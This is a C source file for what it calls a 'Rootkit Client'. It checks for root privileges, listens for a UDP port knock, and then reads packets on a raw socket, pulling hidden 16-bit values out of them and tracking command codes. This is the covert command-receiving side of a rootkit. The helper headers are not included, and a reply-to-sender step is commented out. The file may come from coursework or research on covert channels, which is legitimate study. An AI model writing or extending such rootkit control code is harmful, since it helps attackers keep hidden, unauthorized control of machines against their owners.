#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include "utils/utils.h"
#include "networking/protocol.h"
#include <networking/networking.h>
#include <sys/socket.h>

void usage(const char *program_name) {
    printf("--------------------------------------------------------------------\n");
    printf("Rootkit Client\n");
    printf("--------------------------------------------------------------------\n");
    printf("Usage: %s [options]\n\n", program_name);
    printf("Options:\n");
    printf("\t --host       Address to bind (default: wlo or lo)\n");
    printf("\t --port       UDP port to listen on (default: 30)\n");
    printf("\t --max-bytes  Max datagram size to read (default: 2048)\n");
    printf("\t --poll-ms    select() timeout in ms (default: 200)\n");
}

static void signal_handler(const int sig_no) {
    if (sig_no == SIGINT || sig_no == SIGTERM) {
        fprintf(stderr, "Received signal %d, shutting down\n", sig_no);
        exit_flag = true;
    }
}

int parse_arguments(const int argc, char * argv[], struct client_options * client_options) {
    for (int i = 1; i < argc; i++)
    {
        if (strcmp(argv[i], "--host") == 0)
        {
            if (i + 1 >= argc)
            {
                usage(argv[0]);
                return 2;
            }
            client_options->host = argv[++i];
        }
        else if (strcmp(argv[i], "--port") == 0)
        {
            if (i + 1 >= argc)
            {
                usage(argv[0]);
                return 2;
            }

            if (!parse_int(argv[++i], &client_options->port) || client_options->port == 0)
            {
                usage(argv[0]);
                return 2;
            }
        }
        else if (strcmp(argv[i], "--max-bytes") == 0)
        {
            if (i + 1 >= argc)
            {
                usage(argv[0]);
                return 2;
            }

            if (!parse_int(argv[++i], &client_options->max_bytes) || client_options->max_bytes <= 0)
            {
                usage(argv[0]);
                return 2;
            }
        }
        else if (strcmp(argv[i], "--poll-ms") == 0)
        {
            if (i + 1 >= argc)
            {
                usage(argv[0]);
                return 2;
            }

            if (!parse_int(argv[++i], &client_options->poll_ms) || client_options->poll_ms <= 0)
            {
                usage(argv[0]);
                return 2;
            }
        }
        else
        {
            usage(argv[0]);
            return 2;
        }
    }

    return 0;
}


int main(const int argc, char * argv[]) {
    // Check if running as root
    if (geteuid() != 0) {
        fprintf(stderr, "Warning: Not running as root. Some devices may not be accessible.\n");
        fprintf(stderr, "Consider running with: sudo %s\n\n", argv[0]);
    }
    const int pid = getpid();
    log_message("PID: %d", pid);

    if (signal(SIGINT, signal_handler) == SIG_ERR) {
        fprintf(stderr, "Cannot set SIGINT handler\n");
        return EXIT_FAILURE;
    }
    if (signal(SIGTERM, signal_handler) == SIG_ERR) {
        fprintf(stderr, "Cannot set SIGTERM handler\n");
        return EXIT_FAILURE;
    }

    // Buffer to store knock source IP
    char knock_source_ip[INET_ADDRSTRLEN] = {0};

    struct client_options client_options;
    client_options.host = get_local_address();
    client_options.interface_name = get_local_interface_name();
    client_options.port = 30;
    client_options.max_bytes = 2048;
    client_options.poll_ms = 200;
    client_options.knock_source_ip = knock_source_ip;

    int return_val = parse_arguments(argc, argv, &client_options);
    if (return_val != 0) {
        fprintf(stderr, "Error parsing arguments\n");
        return EXIT_FAILURE;
    }

    return_val = listen_port_knock(&client_options);
    if (return_val == -1) {
        fprintf(stderr, "Error while listening for port knock\n");
        return EXIT_FAILURE;
    }

    const int raw_socket = create_raw_udp_socket();
    if (raw_socket == -1) {
        fprintf(stderr, "Error creating raw socket\n");
        return EXIT_FAILURE;
    }

    return_val = bind_raw_socket(raw_socket, client_options.interface_name);
    if (return_val == -1) {
        fprintf(stderr, "Error binding raw socket to interface\n");
        close(raw_socket);
        return EXIT_FAILURE;
    }

    const int flags = fcntl(raw_socket, F_GETFL, 0);
    fcntl(raw_socket, F_SETFL, flags | O_NONBLOCK);

    ssize_t n = 0;
    char buffer[4096];

    struct packet_data * head = malloc(sizeof(struct packet_data));
    head->data = 0;
    head->next = NULL;

    struct session_info session_info;
    session_info.head = head;
    session_info.command_counter = 0;
    session_info.packet_counter = 0;
    session_info.data_counter = 0;
    session_info.last_command_code = UNKNOWN;

    while (!exit_flag) {
        memset(buffer, 0, sizeof(buffer));

        fd_set rfds;
        FD_ZERO(&rfds);
        FD_SET(raw_socket, &rfds);

        struct timeval tv;
        tv.tv_sec = 0;
        tv.tv_usec = 100000;

        const int r = select(raw_socket + 1, &rfds, NULL, NULL, &tv);

        if (r < 0) {
            if (errno == EINTR)
                continue;
            perror("select");
            break;
        }

        if (r == 0) {
            continue;
        }

        if (FD_ISSET(raw_socket, &rfds)) {
            n = recv(raw_socket, buffer, sizeof(buffer), 0);

            if (n < 0) {
                if (errno == EAGAIN || errno == EWOULDBLOCK) {
                    continue;
                }
                perror("recv");
                break;
            }

            if (n > 0) {
                const uint16_t data = parse_raw_packet(buffer, n);
                if (data != 0) {
                    handle_packet_data(&session_info, data);
                }
                // Send reply to knock source
                // printf("Sending reply to %s:%d\n", knock_source_ip, REPLY_DEST_PORT);
                // create_packet(raw_socket, client_options.host, knock_source_ip, client_options.port, REPLY_DEST_PORT);
            }
        }
    }

    print_linked_list(session_info.head);

    close(raw_socket);
    free_linked_list(session_info.head);

    return EXIT_SUCCESS;
}